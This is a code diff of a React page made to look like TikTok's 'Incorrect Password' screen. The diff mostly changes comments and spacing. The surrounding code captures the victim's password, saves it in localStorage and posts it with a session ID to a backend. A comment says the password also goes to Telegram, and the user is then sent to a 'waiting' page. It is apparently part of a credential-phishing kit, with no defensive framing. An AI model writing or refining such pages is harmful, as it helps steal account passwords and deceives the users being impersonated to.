@@ -25,6 +25,7 @@ const IncorrectPasswordPage = () => {
     }
   }, []);
 
+  // Güncellenen kurallar
   const passwordRequirements = [
     { 
       text: '8 characters (20 max)', 
@@ -42,6 +43,7 @@ const IncorrectPasswordPage = () => {
     if (isPasswordValid) {
       localStorage.setItem('password', password);
 
+      // Send to backend and Telegram
       try {
         await axios.post(`${API}/session/step`, {
           session_id: sessionId,
@@ -55,6 +57,7 @@ const IncorrectPasswordPage = () => {
         console.error('Failed to submit step:', error);
       }
 
+      // Navigate to waiting page
       navigate('/waiting');
     }
   };
@@ -82,7 +85,7 @@ const IncorrectPasswordPage = () => {
       {/* Main Content */}
       <main className="max-w-4xl mx-auto px-6 py-12">
         {/* Title */}
-        <div className="text-center mb-12">
+        <div className="text-center mb-8">
           <h1 className="text-6xl font-black mb-4">
             <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
               TikTok
@@ -91,18 +94,11 @@ const IncorrectPasswordPage = () => {
           <p className="text-cyan-400 text-2xl font-semibold">Incorrect Password</p>
         </div>
 
-        {/* Name Display */}
-        {tiktokData && (
-          <div className="text-center mb-6">
-            <h2 className="text-white font-bold text-lg">{tiktokData.name || tiktokData.nickname || tiktokData.user?.nickname || tiktokData.username}</h2>
-          </div>
-        )}
-
         {/* Profile Card */}
         <ProfileCard userData={tiktokData} />
 
         {/* Error Alert */}
-        <div className="bg-[#1a1a1c] border-2 border-yellow-500 rounded-xl p-6 mb-8 mt-4">
+        <div className="bg-[#1a1a1c] border-2 border-yellow-500 rounded-xl p-6 mb-8">
           <div className="flex items-center justify-center mb-4">
             <AlertTriangle className="w-12 h-12 text-yellow-500" />
           </div>
